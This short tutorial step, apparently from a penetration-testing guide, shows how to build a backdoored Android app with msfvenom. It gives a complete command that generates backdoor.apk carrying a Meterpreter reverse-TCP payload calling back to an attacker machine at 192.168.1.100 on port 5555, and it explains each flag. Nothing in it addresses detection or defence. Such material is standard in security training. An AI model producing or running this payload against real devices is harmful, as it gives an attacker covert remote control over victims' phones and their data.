# Malicious APK

In this step, we will generate a malicious APK using the msfvenom tool.
`msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=5555 -o backdoor.apk`

The command above uses `msfvenom` to create a malicious payload for an Android device. This tool merges the functionalities of two older Metasploit utilities, `msfpayload` and `msfencode`.

- `-p android/meterpreter/reverse_tcp`
1. "-p" specifies the payload type.
2. "android/meterpreter/reverse_tcp" means the payload is for an Android device, and it creates a reverse TCP connection.

With a reverse TCP connection, the target (Android device) will connect back to the attacker's system (instead of the attacker directly accessing the target).

- `LHOST=192.168.1.100`

This is the local host IP address (the attacker's machine) that the target will connect back to.
- `LPORT=5555`

This is the local port on the attacker's machine that will listen for the connection. Port 5555 is used here.

- `-o backdoor.apk`

The -o option specifies the output file. Here, the payload will be embedded in an Android APK file named backdoor.apk.
